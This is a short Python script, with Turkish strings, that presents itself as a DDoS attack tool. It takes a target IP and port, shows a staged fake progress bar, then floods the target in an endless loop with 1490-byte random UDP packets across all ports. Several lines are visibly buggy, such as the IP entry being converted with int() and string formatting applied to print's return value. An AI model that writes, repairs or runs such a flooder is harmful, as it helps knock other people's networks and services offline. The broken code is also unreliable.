import sys
import os
import time
import socket
import random

#Kod Zamanı
from datetime import datetime
şimdi = datetime.now()
saat = şimdi.hour
dakika = şimdi.minute
gün = şimdi.day
ay = şimdi.month
yil = şimdi.year

##############
soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
baytlar = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Saldiri Araci")
print 
ip = int(input("IP Hedefi : "))
port = int(input("Port numarasını girin: "))

os.system("clear")
os.system("figlet F4KOR4LL DDOS ATTACK TOOL")
print("Saldırı Yapılıyor [                    ] 0% ")
time.sleep(5)
print("Saldırı Yapılıyor [=====               ] 25%")
time.sleep(5)
print("Saldırı Yapılıyor [==========          ] 50%")
time.sleep(5)
print("Saldırı Yapılıyor [===============     ] 75%")
time.sleep(5)
print("Saldırı Yapılıyor [====================] 100%")
time.sleep(3)
gönderilen = 0
while True:
  soket.sendto(baytlar, (ip,port))
  gönderilen = gönderilen + 1
  port = int(port) + 1
  print("%s IP adresine ve %s nolu porta %s paket gönderildi.")%(ip,port,gönderilen)
  if port == 65535:
    port = 1